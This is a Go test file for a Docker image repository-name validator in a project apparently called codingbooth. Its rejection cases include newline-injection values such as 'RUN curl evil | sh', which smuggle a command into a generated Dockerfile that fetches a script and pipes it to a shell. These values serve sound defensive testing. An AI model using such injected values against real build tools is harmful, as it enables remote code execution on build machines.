// Copyright 2025-2026 : Nawa Manusitthipol
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.

package boothfile

import (
	"strings"
	"testing"
)

func TestValidateRepo_Accepts(t *testing.T) {
	cases := []string{
		"nawaman/codingbooth",
		"cb-local/codingbooth",
		"registry.example.com:5000/team/img",
		"ghcr.io/org/repo",
		"a",
		"a1.b-c_d/e",
	}
	for _, repo := range cases {
		if err := ValidateRepo(repo); err != nil {
			t.Errorf("ValidateRepo(%q) returned unexpected error: %v", repo, err)
		}
	}
}

func TestValidateRepo_Rejects(t *testing.T) {
	cases := map[string]string{
		"newline injection":         "foo\nRUN curl evil | sh",
		"carriage return injection": "foo\rRUN x",
		"leading dash":              "-foo",
		"leading slash":             "/foo",
		"leading dot":               ".foo",
		"space":                     "foo bar",
		"tab":                       "foo\tbar",
		"shell metachar $":          "foo$bar",
		"shell metachar `":          "foo`bar`",
		"shell metachar ;":          "foo;bar",
		"shell metachar &":          "foo&bar",
		"empty":                     "",
		"too long":                  strings.Repeat("a", 256),
	}
	for label, repo := range cases {
		if err := ValidateRepo(repo); err == nil {
			t.Errorf("ValidateRepo(%q) [%s] should have failed but didn't", repo, label)
		}
	}
}

func TestRepoFromEnv_Unset(t *testing.T) {
	t.Setenv("CB_PREBUILD_REPO", "")
	repo, err := RepoFromEnv()
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if repo != "" {
		t.Fatalf("expected empty repo when unset, got %q", repo)
	}
}

func TestRepoFromEnv_ValidValue(t *testing.T) {
	t.Setenv("CB_PREBUILD_REPO", "cb-local/codingbooth")
	repo, err := RepoFromEnv()
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if repo != "cb-local/codingbooth" {
		t.Fatalf("got %q", repo)
	}
}

func TestRepoFromEnv_RejectsInjection(t *testing.T) {
	t.Setenv("CB_PREBUILD_REPO", "evil/img\nRUN curl x | sh")
	repo, err := RepoFromEnv()
	if err == nil {
		t.Fatalf("expected error for injection payload, got repo=%q", repo)
	}
	if repo != "" {
		t.Fatalf("expected empty repo on error, got %q", repo)
	}
}

func TestCompiler_RepoOption(t *testing.T) {
	compiler := NewCompilerWithOptions(CompilerOptions{Repo: "cb-local/codingbooth"})
	result := compiler.Compile(ParseResult{})
	if !strings.Contains(result.Dockerfile, "FROM cb-local/codingbooth:") {
		t.Fatalf("expected custom repo in FROM line, got:\n%s", result.Dockerfile)
	}
}

func TestCompiler_RepoOptionEmptyFallsBackToDefault(t *testing.T) {
	compiler := NewCompilerWithOptions(CompilerOptions{Repo: ""})
	result := compiler.Compile(ParseResult{})
	if !strings.Contains(result.Dockerfile, "FROM "+DefaultRepo+":") {
		t.Fatalf("expected DefaultRepo in FROM line, got:\n%s", result.Dockerfile)
	}
}
